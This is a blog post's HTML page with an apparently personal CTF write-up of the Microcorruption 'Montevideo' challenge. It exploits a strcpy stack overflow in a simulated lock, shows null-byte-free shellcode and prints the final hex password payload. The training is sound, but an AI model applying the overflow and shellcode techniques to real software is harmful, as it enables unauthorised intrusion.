<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  
  <script type="application/ld+json">
{
    "@context" : "http://schema.org",
    "@type" : "BlogPosting",
    "mainEntityOfPage": {
         "@type": "WebPage",
         "@id": "https://leonjza.github.io"
    },
    "articleSection" : "post",
    "name" : "microcorruption - montevideo",
    "headline" : "microcorruption - montevideo",
    "description" : "<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png" />
    
    
</figure>


<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">previous challenge</a> called <em>Whitehorse</em>. This challenge is titled <em>Montevideo</em>.</p>

<p>The challenge has the following description when you start:</p>

<blockquote>
<p>This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.</p>
</blockquote>

<p>Cool. So this one is going to be unbreakable right? Lets see!
</p>",
    "inLanguage" : "en-US",
    "author" : "Leon Jacobs",
    "creator" : "Leon Jacobs",
    "publisher": "Leon Jacobs",
    "accountablePerson" : "Leon Jacobs",
    "copyrightHolder" : "Leon Jacobs",
    "copyrightYear" : "2018",
    "datePublished": "2018-03-08 18:12:36 &#43;0200 SAST",
    "dateModified" : "2018-03-08 18:12:36 &#43;0200 SAST",
    "url" : "https://leonjza.github.io/blog/2018/03/08/microcorruption---montevideo/",
    "wordCount" : "1100",
    "keywords" : [ "ctf","exploit","assembly","microcorruption","montevideo","Blog" ]
}
</script>


  <title>microcorruption - montevideo &middot; </title>

  
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
  

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
  <link href="https://leonjza.github.io/favicon.png" rel="icon">

  
  
  
  

  <meta name="description" content="">
  <meta name="keywords" content="">
  
  <script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-44457032-2', 'auto');
    ga('send', 'pageview');
  </script>
  
</head>
<body class="theme-base-0d">
<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      
      <h1></h1>
      <p class="lead">#!/slash/note<br />
<em>A checkbox unchecker&rsquo;s notepad</em></p>
    </div>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Blog</a></li>
      
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/post">Posts</a></li>
      
      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About Me</a></li>
      
    </ul>

    <ul class="sidebar-nav">
      <li class="sidebar-nav-item">
      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
      
      
      
      
      
      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
      
      
      </li>
    </ul>

    

    <p>Copyright &copy; 2018 <a href="https://leonjza.github.io/license/">License</a><br/>
       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>

  </div>
</div>


<div class="content container">
  <div class="post">
    <h1 class="post-title">microcorruption - montevideo</h1>
    <span class="post-date">Mar 8, 2018 &middot; 6 minute read &middot; <a href="https://leonjza.github.io/blog/2018/03/08/microcorruption---montevideo/#disqus_thread">Comments</a>
    
    <br/>
    <a class="label" href="https://leonjza.github.io/categories/ctf">ctf</a><a class="label" href="https://leonjza.github.io/categories/exploit">exploit</a><a class="label" href="https://leonjza.github.io/categories/assembly">assembly</a><a class="label" href="https://leonjza.github.io/categories/microcorruption">microcorruption</a><a class="label" href="https://leonjza.github.io/categories/montevideo">montevideo</a>
    </span>
    <figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/microcorruption.png" />
    
    
</figure>


<p>This post is part of the series of solving <a href="https://microcorruption.com">microcorruption.com</a> ctf challenges which continues from the <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">previous challenge</a> called <em>Whitehorse</em>. This challenge is titled <em>Montevideo</em>.</p>

<p>The challenge has the following description when you start:</p>

<blockquote>
<p>This is Software Revision 03. We have received unconfirmed reports of issues with the previous series of locks. We have reimplemented much of the code according to our internal Secure Development Process.</p>
</blockquote>

<p>Cool. So this one is going to be unbreakable right? Lets see!
</p>

<h2 id="montevideo">montevideo</h2>

<p>Montevideo follows a similar code pattern when compared to some of the previous challenges we have done where a simple <code>main</code> routine calls <code>login</code>. Looking at <code>login</code> itself we can see a few new things:</p>

<pre><code class="language-asm">44f4 &lt;login&gt;

[.. typical getsn call to get the password ..]

; strcpy, thats new!
451a:  b012 dc45      call  #0x45dc &lt;strcpy&gt;
451e:  3d40 6400      mov   #0x64, r13
4522:  0e43           clr   r14
4524:  3f40 0024      mov   #0x2400, r15

; memset is also an interesting one!
4528:  b012 f045      call  #0x45f0 &lt;memset&gt;
452c:  0f41           mov   sp, r15

; probably checks the password again
452e:  b012 4644      call  #0x4446 &lt;conditional_unlock_door&gt;
4532:  0f93           tst   r15

[.. some messages printed to tell if you unlocked or not ..]

4544:  3150 1000      add   #0x10, sp
4548:  3041           ret
</code></pre>

<p>The calls to <code>strcpy</code> and <code>memset</code> immediately jumped out at me here. I also figured since there is mention of the password size again the bug here might be related to a stack overflow too. To test this, I threw in like 30 <code>A</code>&rsquo;s into the password field to see if the program breaks.</p>


<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/montevideo_stack_overflow.png" />
    
    
</figure>


<blockquote>
<p>insn address unaligned</p>
</blockquote>

<p>Nice! The program counter (<code>pc</code>) has <code>0x4141</code> which most probably comes from our longer-than-its-supposed-to-be password we supplied. With this bug in mind, I quickly had a look at the other routines to see if there is anything interesting happening there. I set up a total of four breakpoints at the following locations:</p>

<ul>
<li><code>0x4510</code> at <code>getsn</code></li>
<li><code>0x451a</code> at <code>strcpy</code></li>
<li><code>0x4528</code> at <code>memset</code></li>
<li><code>0x452e</code> at <code>conditional_unlock_door</code></li>
</ul>

<p>Inspecting these routines manually, as well as the memory layout after each function had me draw the following conclusions:</p>

<ul>
<li>After <code>getsn</code> is done, the password buffer lives at <code>0x2400</code> in memory.</li>
<li>Once <code>strcpy</code> is done, the password buffer at <code>0x2400</code> is copied into a buffer that starts at <code>0x43ef</code>.</li>
<li>After <code>memset</code> is done, the password buffer at <code>0x2400</code> is zeroed out.</li>
<li>After <code>conditional_unlock_door</code> with a too long password buffer, the stack is corrupt and the return address to <code>main</code> overridden.</li>
</ul>

<p>It seems like this challenge is pretty much exactly the same as previous Whitehorse challenge? The <code>conditional_unlock_door</code> routine calls syscall <code>0x7e</code>, so with our overflow this is not a useful location to jump to as the &ldquo;HSM&rdquo; will validate the password. So, like the previous one, we just need a spot to slide in some shellcode.</p>

<p>Before we can supply the shellcode though, we need to find out where we are overriding and corrupting the stack for that <code>ret</code> instruction. For this, I just supplied a bunch of <code>A</code>&rsquo;s and <code>B</code>&rsquo;s and found that at position 17 and 18 again we have control over the programs execution flow.</p>


<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/monte_video_ret_control.png" />
    
    
</figure>


<p>Next, we choose a location in memory where our password buffer is as the address we should jump to (as a result of the <code>ret</code>) which should also be the start of our shellcode. I simply copied the unlock shellcode from <a href="https://leonjza.github.io/blog/2018/03/07/microcorruption---whitehorse/">Whitehorse</a> which was <code>30127f00b0123245</code>. The shellcode itself needs a little work though as the address to the <code>INT</code> routine would be different here.</p>

<p>To help with the shellcode modifications we need to do, we can use the assembler/dissasembler provided on microcorruption.com <a href="https://microcorruption.com/assembler">here</a>. Grab the opcodes that form part of our shellcode, paste them into the input box and hit disassemble. Now, with the ASM mnemonics in the input box, update the address to <code>call</code> to <code>0x454c</code> as that is where it lives in this challenge. Finally, hit assemble and be presented with your shellcode :D</p>


<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/montevideo_shellcode_1.png" />
    
    
</figure>


<p>I figured a good spot to jump to our shellcode would be just after the <code>ret</code> address at <code>0x4400</code>, so, my password payload was now going to be:</p>

<pre><code class="language-text"># ret is 0x4400, so 0044 little endian

[padding to ret] +  [ret] +    [shellcode]
---------------------------------------------
    41 * 16      +  0044  +  30127f00b0124c45 =

# final password payload
41414141414141414141414141414141004430127f00b0124c45
</code></pre>

<p>Sending this password payload, and inspecting the program after a breakpoint at <code>0x4548</code> left the program in a confusing state.</p>


<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/montevideo_strcpy_nullbyte.png" />
    
    
</figure>


<p>It was clear that the jump to <code>0x4400</code> was taken as the program counter (<code>pc</code>) was there, but, my shellcode was missing. Well&hellip; if you have ever dealt with <code>strcpy</code> before, you may have spotted that this was going to happen as soon as I chose <code>0x4400</code> as the address to jump to, as that address contains a nullbyte which is a string terminator for <code>strcpy</code>. Easy fix really, just move along two bytes to avoid a <code>0x00</code> byte. With a two byte shift, our password payload looks something like this:</p>

<pre><code class="language-text">[padding to ret] +  [ret] +  [pad] + [shellcode]
-----------------------------------------------------
    41 * 16      +  0244  +  4242  + 30127f00b0124c45

414141414141414141414141414141410244424230127f00b0124c45
</code></pre>


<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/montevideo_null_byte_shellcode.png" />
    
    
</figure>


<p>Snap. We have made a little progress, but there is still a null byte in our shellcode because of the opcodes that form part of the <code>push #0x7f</code> instruction which is <code>3012 7f00</code>. We need to get rid of the <code>0x00</code> byte. We can simply modify the shellcode to use any other instructions that will eventually push the value <code>0xf7</code> to the stack. Think of things like moving a large value into a register, performing arithmetic and then moving the resultant register value onto the stack instead of the original value as is.</p>

<p>I used existing instructions in the program as a reference for ideas on how I can modify the shellcode to avoid null bytes. This was the final shellcode I got to work using the disassembler <a href="https://microcorruption.com/assembler">here</a>:</p>

<pre><code class="language-asm">mov     #0x117e, r9
sub     #0x10ff, r9
push    r9
call    #0x454c
</code></pre>

<p>First, I took a large 2 byte value of <code>0x117e</code> and moved that to <code>r9</code>. I then took a calculator and subtracted the desired value of <code>0x7f</code> from <code>0x117e</code> and got to <code>0x10ff</code>. That resulted in my second instruction of <code>sub #0x10ff, r9</code> which should leave the value <code>0x7f</code> in register <code>r9</code>. Finally, just push <code>r9</code> onto the stack and call <code>INT</code>.</p>


<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/montevideo_final_shellcode.png" />
    
    
</figure>


<p>So now, my final password payload looks as follows:</p>

<pre><code class="language-python">python -c &quot;print('41' * 16 + '0244' + '4242' + '39407e113980ff100912b0124c45')&quot;
414141414141414141414141414141410244424239407e113980ff100912b0124c45
</code></pre>


<figure>
    
        <img src="https://leonjza.github.io/images/microcorruption/montevideo_unlock.png" />
    
    
</figure>


<p>Works! <code>r9</code> ends up as <code>0x7f</code>, pushed to the stack and <code>INT</code> is called to unlock the lock.</p>

<h2 id="solution">solution</h2>

<p>Enter <code>414141414141414141414141414141410244424239407e113980ff100912b0124c45</code> as hex encoded input.</p>

<h2 id="other-challenges">other challenges</h2>

<p>For my other write ups in the microcorruption series, checkout <a href="https://leonjza.github.io/categories/microcorruption/">this</a> link.</p>
  </div>
  <div id="disqus_thread"></div>
</div>


<script type="text/javascript">
var disqus_shortname = "slashnote";
(function () {
    var s = document.createElement('script'); s.async = true;
    s.type = 'text/javascript';
    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
}());
</script>



<script type="text/javascript">
    var disqus_shortname = "slashnote";
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>

<script src="https://leonjza.github.io/js/highlight.pack.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
</body>
</html>

